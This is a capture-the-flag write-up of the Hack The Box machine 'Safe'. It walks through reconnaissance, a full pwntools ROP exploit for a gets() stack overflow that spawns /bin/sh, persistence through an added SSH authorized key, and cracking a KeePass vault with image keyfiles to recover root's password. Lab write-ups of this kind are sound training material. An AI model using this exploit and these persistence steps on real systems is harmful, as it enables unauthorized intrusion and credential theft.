---
layout: single
title: Safe - Hack The Box
excerpt: "Safe was a bit of a surprise because I didn't expect a 20 points box to start with a buffer overflow requiring ropchains. The exploit is pretty straightforward since I have the memory address of the system function and I can call it to execute a shell. The privesc was a breeze: there's a keepass file with a bunch of images in a directory. I simply loop through all the images until I find the right keyfile that I can use with John the Ripper to crack the password and recover the root password from the keepass file."
date: 2019-10-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-safe/safe_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - binary exploit
  - buffer overflow
  - keepass
---

![](/assets/images/htb-writeup-safe/safe_logo.png)

Safe was a bit of a surprise because I didn't expect a 20 points box to start with a buffer overflow requiring ropchains. The exploit is pretty straightforward since I have the memory address of the system function and I can call it to execute a shell. The privesc was a breeze: there's a keepass file with a bunch of images in a directory. I simply loop through all the images until I find the right keyfile that I can use with John the Ripper to crack the password and recover the root password from the keepass file.

## Summary

- I find a custom service running on port 1337 that has a buffer overflow
- I create an exploit using ROP for the vulnerable service and gain RCE
- Once I have a shell I find a KeePass vault with a bunch of image files
- I can crack the password for the KeePass vault (one of the image file is the keyfile) which contains the root password

### Recon

I'm going to use masscan this time to speed up the portscan:
```
root@kali:~# masscan -p1-65535 10.10.10.147 --rate 1000 ---open --banners -e tun0

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-29 01:13:24 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 1337/tcp on 10.10.10.147
Discovered open port 80/tcp on 10.10.10.147
Discovered open port 22/tcp on 10.10.10.147
```

Additional scripts and banner checks with nmap now that I have the list of ports open:
```
root@kali:~# nmap -p22,80,1337 -sC -sV 10.10.10.147
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-28 21:17 EDT
Nmap scan report for 10.10.10.147
Host is up (0.021s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     21:14:29 up 5:00, 1 user, load average: 0.01, 0.01, 0.00
[...]
```

Observations:

 - Standard SSH and Apache combo running. I'll make sure to enumerate that HTTP page next.
 - There's a weird service running on port 1337. This is not a standard port so I'm probably looking at a custom service created for the purpose of this box.

### First pass at checking the Apache service

Looks like the default Debian Apache2 webpage is up on port 80.

![](/assets/images/htb-writeup-safe/httpd.png)

I get the same default page if I add  `safe.htb` to my local hostfile. Next, I'll run Nikto to check for low hanging fruits like `robots.txt` and dirbust using gobuster and `big.txt`:

```
root@kali:~# nikto -host 10.10.10.147
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.147
+ Target Hostname:    10.10.10.147
+ Target Port:        80
+ Start Time:         2019-07-28 21:22:32 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2a23, size: 588c4cc4e54b5, mtime: gzip
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ OSVDB-3092: /manual/: Web server manual found.
[...]

root@kali:~# gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.147
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.147
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/07/28 21:22:53 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/manual (Status: 301)
/server-status (Status: 403)
```

I didn't find anything interesting. I'll go check out that other port 1337 but I keep in mind that I should fuzz for additional vhosts later if I don't find anything else.

### Custom service on port 1337

The service on port 1337 shows the output of uptime then echoes back whatever is typed by the user. The connection drops after the input is echoed back.

![](/assets/images/htb-writeup-safe/bof1.png)

I normally go for simple command injection payloads first and since this is a 20 points this is a likely candidate for that sort of stuff. Unfortunately, the box doesn't seem to be calling echo or any other Linux binary to echo the input back. I wasn't able to escape any payload.

Next, I try a long string of characters and see that the connection drops without echoing back the data.

![](/assets/images/htb-writeup-safe/bof2.png)

So I'm probably looking at a buffer overflow exploit here. I don't have the binary to analyze and I don't know how to exploit a service blind. The service doesn't leak any memory data when it crashes, nor do I see any menu or commands that I can use to access additional features.

I'll go back to the webpage and look for clues in the HTML comments. It's not realistic at all but I find a link to the binary in the comments:

![](/assets/images/htb-writeup-safe/link.png)

I can download the file at `http://10.10.10.147/myapp`

It's a 64 bits ELF:

![](/assets/images/htb-writeup-safe/file.png)

With gdb and the gef extension, I check what kind of protections are enabled and notice that NX is enabled but PIE isn't:

![](/assets/images/htb-writeup-safe/checksec.png)

I don't know if ASLR is enabled or not on the box though. Time to disassemble the binary and understand how the program works. I'll use radare2 for this:

![](/assets/images/htb-writeup-safe/radare2.png)

The `sym.test` and `sym.main` are the ones I'm gonna look at first:

The `sym.main` function is pretty straighforward:

- It allocates 112 bytes on the stack
- It executes `/usr/bin/uptime`
- It prints `What do you want me to echo back?`
- It reads 1000 bytes from the user using `gets`. This is where the buffer overflow is: it reads more information than the buffer allocated on the stack can store.
- It echoes back the user input using `puts`

![](/assets/images/htb-writeup-safe/main.png)

The other function `sym.test` doesn't do anything useful at first glance: it just moves a few registers and jumps to the memory address contained in the r13 register. Normally, functions return with `ret` instruction but this one doesn't, very odd.

![](/assets/images/htb-writeup-safe/test.png)

Before working on an exploit, I want to confirm the exact offset for the overflow.

I'll generate a payload of 112 A's (as per the disassembly analysis) + 8 bytes containing B. If I'm right, the B's will land into RBP after the function returns.

![](/assets/images/htb-writeup-safe/offset1.png)

When I copy/paste the payload in the program, it crashes and I can see the $rbp register contains "BBBBBBBB".

![](/assets/images/htb-writeup-safe/offset2.png)

This confirms that the offset to control RIP is 112 + 8: 120 bytes.

### Building the exploit

I can't just put a shellcode on the stack because NX is enabled so the stack isn't executable. This is a 20 points box so the exploit is likely something pretty basic and won't require advanced ropping skills.

I have few things I can use to my advantage:

- The input uses the `gets` function and it doesn't null-terminates so I can use null bytes in my payload
- The `system` function is present in the code so there's a PLT/GOT entry for this
- PIE isn't enabled so the address for `system` doesn't change

Using `objdump` I can find the address for `system`: 0x401040
```
root@kali:~/htb/machines/safe# objdump -d myapp

0000000000401040 <system@plt>:
  401040:	ff 25 da 2f 00 00    	jmpq   *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
  401046:	68 01 00 00 00       	pushq  $0x1
  40104b:	e9 d0 ff ff ff       	jmpq   401020 <.plt>
```  

Checking the man page for `system`, I see that it takes a single parameter:

```
NAME
       system - execute a shell command

SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);
```

The x86-64 calling convention for gcc compiled binaries is RDI, RSI, RDX, RCX for the first four function arguments. To control the binary called by system, I need to point RDI to the memory address of the `/bin/sh` string. I'll switch back to gdb / gef to build the exploit.

I'll put a breakpoint on the return instruction from the main function and check what the RDI register is pointing to:

![](/assets/images/htb-writeup-safe/ret1.png)

RDI has a null-value so it doesn't point to a memory location I control and therefore is useless at the moment.

Next, I'm gonna use `ropper -f myapp` to look for gadgets I can use to control registers:

![](/assets/images/htb-writeup-safe/ropper.png)

I'll use the gadget at `0x401206` to put the address of `system` into `r13`. I don't care about `r14` and `r15` so I can put any dummy values here. The trick to get the address of `/bin/sh` is in the `sym.test` function. The first instruction pushes `rbp` (which contains the address of `/bin/sh`) on the stack so it updates the `rsp` address. The `mov rdi, rsp` instruction in the fonction takes care of copying the address of `rsp` into `rdi`. At that point I'm all set and when the function jumps to `r13` it will execute `system` with `/bin/sh` as the parameter.

The final exploit looks like this:

```python
from pwn import *

p = remote("safe.htb", 1337)
#p = process("./myapp")

context(os="linux", arch="amd64")
context.log_level = "DEBUG"

JUNK = "A" * 112
JUNK += "/bin/sh\x00" # RBP

"""
ROP chain to populate r13 with system()'s address:

0x0000000000401206: pop r13; pop r14; pop r15; ret;

sym.test() -> Need to JMP to address of system at the end
 (fcn) sym.test 10
   sym.test ();
           0x00401152      55             push rbp
           0x00401153      4889e5         mov rbp, rsp
           0x00401156      4889e7         mov rdi, rsp
           0x00401159      41ffe5         jmp r13
"""

payload = JUNK + p64(0x0000000000401206)    # ROP chain gadget
payload += p64(0x401040)     # pop r13
payload += "BBBBBBBB"        # pop r14
payload += "CCCCCCCC"        # pop r15
payload += p64(0x00401152)   # sym.test

p.recvline()
p.sendline(payload)
p.interactive()
```

Running the exploit, I'm able to land a shell on the box:

![](/assets/images/htb-writeup-safe/user.png)

Because the SSH service is listening, I can dump my SSH public key in `/home/user/.ssh/authorized_keys`:

![](/assets/images/htb-writeup-safe/keys.png)

And then I can SSH in and get a proper shell:

![](/assets/images/htb-writeup-safe/shell.png)

### Privesc

The user directory has a keepass file: `MyPasswords.kdbx` and a bunch of image files:

![](/assets/images/htb-writeup-safe/dir.png)

I'll copy those files locally so I can attempt to crack the Keepass file:

![](/assets/images/htb-writeup-safe/scp.png)

I can't crack the Keepass file just by itself:

![](/assets/images/htb-writeup-safe/keepass1.png)

But I'm gonna try all those .jpg files as keyfiles:

![](/assets/images/htb-writeup-safe/crack.png)

IMG_0547.JPG is the keyfile and `bullshit` is the password

Using `kpcli` I can open the Keepass file and view the password for root:

![](/assets/images/htb-writeup-safe/password.png)

I can login and `su` to root:

![](/assets/images/htb-writeup-safe/root.png)


